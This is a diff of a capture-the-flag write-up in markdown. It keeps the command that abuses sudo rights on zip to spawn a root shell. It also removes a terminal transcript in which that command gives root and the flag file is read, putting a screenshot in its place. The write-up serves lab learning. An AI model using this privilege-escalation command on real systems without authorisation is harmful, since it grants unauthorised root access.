@@ -200,18 +200,8 @@ sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF
 ```
 
-jeanpaul@dev:~$ TF=$(mktemp -u)
-jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
-  adding: etc/hosts (deflated 31%)
-# id 
-uid=0(root) gid=0(root) groups=0(root)
-# cd /root
-# ls
-flag.txt
+![image](https://user-images.githubusercontent.com/66864342/160245568-96c1fe61-2516-4811-b792-0358998ad105.png)
 
-# cat flag.txt
-Congratz on rooting this box !
-# 
 
 
 BOOM JOB DONE!
